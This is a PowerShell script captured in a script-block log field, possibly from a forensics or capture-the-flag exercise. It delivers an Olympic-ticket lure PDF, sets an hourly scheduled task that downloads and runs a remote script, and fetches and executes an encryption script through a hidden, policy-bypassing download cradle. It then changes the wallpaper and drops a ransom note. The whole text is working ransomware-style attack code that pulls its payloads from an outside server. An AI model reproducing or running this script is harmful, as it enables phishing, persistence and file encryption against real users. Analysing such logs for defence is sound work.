ScriptBlockText": "$IP_addr = '172.21.195.17:5000'

$urlFakeJob = \"http://$IP_addr/Holmes/Tirage_au_sort_pour_gagner_des_places_aux_Jeux_Olympiques_de_Paris_2024.pdf\"
$urlTask = \"http://$IP_addr/Holmes/GetFileInfo.ps1\"
$fakePlaceOffer = 'Tirage_au_sort_pour_gagner_des_places_aux_Jeux_Olympiques_de_Paris_2024.pdf'
$TaskFile = 'GetFilesInfo.ps1'

#Get the lure pdf
Invoke-WebRequest -Uri $urlFakeJob -OutFile $fakePlaceOffer

# Open the PDF file with the default PDF viewer
Start-Process -FilePath $fakePlaceOffer

### Schedule task
$taskName = \"IGotYourFileInfo\"

# Create the scheduled task that get some file information
$cmd = \"Invoke-WebRequest -Uri $urlTask -OutFile $TaskFile ; Start-Process -FilePath $TaskFile\"
schtasks /create /tn $taskName /sc HOURLY /tr $cmd

#Encrypt some file

powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass -nologo -noprofile  -c \"& {IEX ((New-Object Net.WebClient).DownloadString('http://$IP_addr/Holmes/Encrypt.ps1'))}\"

## Change wallpaper
$webClient = New-Object System.Net.WebClient
$wallpaperUrl = \"http://$IP_addr/Holmes/wallpaper.jpg\"
$wallpaperPath = \"$env:USERPROFILE\\Desktop\\wallpaper.jpg\"
$webClient.DownloadFile($wallpaperUrl, $wallpaperPath)

## Set the wallpaper
$regKey = \"HKCU:\\Control Panel\\Desktop\"
Set-ItemProperty -Path $regKey -Name Wallpaper -Value $wallpaperPath
$wallpaperStyle = \"3\"
Set-ItemProperty -Path $regKey -Name WallpaperStyle -Value $wallpaperStyle
$tileWallpaper = \"0\"
Set-ItemProperty -Path $regKey -Name TileWallpaper -Value $tileWallpaper

# Forcer l'actualisation du bureau
Start-Process -FilePath \"RUNDLL32.EXE\" -ArgumentList \"USER32.DLL,UpdatePerUserSystemParameters ,1 ,True\" -Wait

## Create text file
$fileContent = \"YOU HAVE BEEN INFECTED BY THE HAMOR FIND THE KEY TO RETREIVE YOUR FILE\"
Set-Content \"$env:USERPROFILE\\Desktop\\instructions.txt\" -Value $fileContent
# Open text file
Invoke-Item \"$env:USERPROFILE\\Desktop\\instructions.txt\"
